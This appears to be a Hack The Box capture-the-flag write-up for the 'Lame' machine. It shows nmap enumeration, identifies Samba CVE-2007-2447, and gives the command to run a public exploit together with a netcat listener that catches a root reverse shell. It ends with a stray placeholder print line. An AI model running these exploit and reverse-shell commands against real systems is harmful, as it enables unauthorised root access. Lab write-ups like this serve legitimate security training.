+++
title = 'HackTheBox - Lame'
date = 2023-09-15T17:03:12+02:00
draft = false
+++

**Lame** is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

# Info


    OS - Linux
    Difficulty - Easy
    Points - /
    Release - 14 Mar, 2017
    IP - 10.10.10.3

# Enumeration

## Nmap Scan

**`nmap -sC -sV -Pn 10.10.10.3`**

```Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-15 17:13 CEST
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.055s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  Q5V      Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m33s, deviation: 2h49m44s, median: 31s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-15T11:14:12-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Service Observation

Here we can't see any open HTTP or HTTPS ports, but what we can see is open ftp, ssh and samba ports, after the research about services and their versions we can see that Samba on port 139 is vulnerable (CVE-2007-2447).

## More about CVE-2007-2447
To exploit this vulnerability, an attacker would send a specially crafted request to the Samba server, taking advantage of the username map script feature. By doing so, they could execute arbitrary code with the privileges of the Samba server process, potentially gaining control over the server.

# Exploitation

To exploit this vulnerability we found we are gonna use publicly available exploit:
https://github.com/amriunix/CVE-2007-2447

First what we are gonna do is install this tool and read the usage commands!

```
python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
```

- `RHOST` -- The target address
- `RPORT` -- The target port (TCP : 139)
- `LHOST` -- The listen address
- `LPORT` -- The listen port

In this specific scenario:
**RHOST** = `10.10.10.3`
**RPORT** = `139`
Now we will get the lhost by running the command `ifconfig` 
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet ***10.10.14.5***  netmask 255.255.254.0  destination 10.10.14.5

So in this scenario
**LHOST** = `10.10.14.5`
**LPORT** = (we can choose the port we want, in this case i choose 1234) = `1234`

so the command would be 
## Running the exploit
```
python usermap_script.py 10.10.10.3 139 10.10.14.5 1234
```

Before running the command we will run *netcat* listener on port **1234** like this:

```
nc -lvnp 1234
```
## PoC
After running the exploit we will get the *reverse shell* as **root**

![Minion](https://github.com/pepax3/pepax3.github.io/blob/main/content/posts/HackTheBox%20-%20Lame/PoC.png?raw=true)

``` py
 print("This line will be printed.")
```

